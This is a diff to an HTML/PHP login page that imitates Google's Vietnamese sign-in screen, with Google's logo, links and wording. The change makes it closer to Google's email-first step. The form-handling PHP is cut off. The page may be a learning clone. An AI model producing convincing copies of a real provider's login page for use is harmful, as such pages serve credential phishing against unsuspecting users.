@@ -12,6 +12,7 @@
 </head>
 
 <body>
+  <div class="con">
   <div class="login">
     <div class="logo_login">
       <img src="image/google_login.jpg" style="width: 75px; height: 24px;"alt="">
@@ -22,17 +23,16 @@
       <!-- <label for="exampleFormControlInput1" class="form-label">Email hoặc số điện thoại</label> -->
       <input type="email" class="form-control" id="exampleFormControlInput1" placeholder="Email hoặc số điện thoại" name="username">
     </div>
-    <div class="mb-3">
-      <!-- <label for="exampleFormControlInput1" class="form-label">Password</label> -->
-      <input type="password" class="form-control" id="exampleFormControlInput1" placeholder="Password" name="password">
-    </div>
+    <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin" style="font-size: 15px; color: #1a73e8; margin-top:0px;text-decoration: none"><b>Bạn quên địa chỉ email?</b></a>
     <div style="font-size: 13px;">Đây không phải máy tính của bạn? Hãy sử dụng chế độ Khách để đăng nhập một cách riêng tư. <a href="https://support.google.com/chrome/answer/6130773?hl=vi">Tìm hiểu thêm</a></div>
     
     <div class="btn_login">
       <a href="singup.php">Tạo tài khoản</a>
-      <button type="submit" class="btn btn-primary btn-block" style="margin-left: 0px;" name="btn_submit">Sign In</button>
+      <button type="submit" class="btn btn-primary btn-block" style="margin-left: 0px;" name="btn_submit">Tiếp theo</button>
     </div>
   </div>
+  </div>
+  
   
   <?php
     if (isset($_POST['btn_submit']))
